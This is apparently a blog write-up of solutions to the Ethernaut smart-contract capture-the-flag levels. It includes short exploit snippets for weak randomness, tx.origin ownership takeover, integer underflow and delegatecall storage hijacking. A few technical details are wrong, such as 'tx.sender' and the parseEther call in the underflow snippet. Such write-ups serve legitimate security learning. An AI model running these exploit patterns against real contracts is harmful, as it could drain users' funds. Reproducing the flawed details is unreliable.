---
layout: post
title:  "OZ's ethernaut challenges"
date:   2022-12-09 16:08:31 +0530
---

Exploits and explanations of ethernaut solutions as of Decemeber 2022.

P.S. Do not expect detailed description. You can most probably find articles with in-depth details out there somwhere.


## hello ethernaut

Follow the instructions

---

## fallback

Goal is to become owner and drain all funds. Well you can obviously drain all the funds using `withdraw()` once you are the owner. 

`owner` is only being updated in the `receive()` which is triggered if we send some ether to contract directly, but it has a check for contribution. 

To clear this level
- trigger `contribute` with 0.001 ether
- send some ether directly (as there is a check on `msg.value` as well) from metamask (or however you want)
- trigger `withdraw`

---

## fallout

This contract is compiled in 0.6.0 and as you can notice after enough staring at the code that the contract name and contructor name are different (`Fallout` and `Fal1out`). Just trigger the constructor (in this case it acts like just another public function without any checks) again.

---

## coin flip

Goal is to get 10 consecute flips accurate.
Blockchain being a deterministic system. It's not possible to get randomness and all that jing-bang with block number and block hash is futile

Contract with the below function easily "predicts" the flip and calls the contract's flip
```solidity
function callFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;

    uint256 guess = blockValue.div(FACTOR);
    bool side = guess == 1 ? true : false;
    coinFlip.flip(side);
  }
```

---

## telephone

This challenge is again straightforward. When a contract function is triggered by another contract, `tx.origin` is the address of EOA which initiates the tx and `tx.sender` is the address of the caller contract.

To solve this, just create a new contract and call `changeOwner`

```solidity

import "../telephone/Telephone.sol";

contract TelephoneHack {

    Telephone telephone;
    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
    }
    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
```

---

## token

First thing to notice is the compiler version, it is 0.6.0 which is pre 0.8.0 overflow underflow checks and since there is no  `SafeMath` library used, it is vulnerable to the attack.

There is no goal mentioned, we can assume the goal is to transfer all the balances to player. It's a small contract with the only non-view function exposed `transfer`.

[solidity integer overflow and underflow](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow)

You have an initial 20 tokens. You can check this with `await token.totalSupply()`. To get all the remaining tokens. You need to underflow the contract i.e, trigger transfer with the value 21 so that `balances[msg.sender] -= _value;` will be 
`20 - 21 => 2^256 - 1`

```solidity
const tx = await token.transfer(ethers.constants.AddressZero, ethers.utils.parseEther("21"));
await tx.wait()
console.log(await token.balanceOf(owner.address));
```

---

## delegation

Delegate calls executes functions of other contract in the context of the caller contract. It's like borrowing logic for execution. If that logic changes the storage, it's changing the storage of the caller contract.

In this level both `Delegation` and `Delegate` have `owner` in their first storage slot, `pwn` in delegate is a public function with no access control. Calling `pwn` from Delegation using delegate will change the storage slot of Delegation using the execution logic Delegate (no access control).

```solidity
let delegate = await Delegate.attach(INSTANCE_ADDRESS);
const tx = await delegate.pwn();
await tx.wait();
```
---


